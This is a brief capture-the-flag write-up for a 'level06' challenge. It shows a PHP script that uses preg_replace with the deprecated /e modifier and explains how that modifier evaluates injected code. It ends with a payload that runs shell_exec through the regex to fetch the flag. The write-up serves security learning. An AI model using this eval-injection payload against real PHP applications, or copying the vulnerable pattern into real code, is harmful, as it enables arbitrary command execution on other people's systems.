There is file level06.php
```
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```
as we see in the regex they used flag /e
The e modifier is a deprecated regex modifier which allows you to use PHP code within your regular expression. This means that whatever you parse in will be evaluated as a part of your program.

so we need to add a php code to get the flag and this code must match the regex 
`[x {${shell_exec(getflag)}}]`
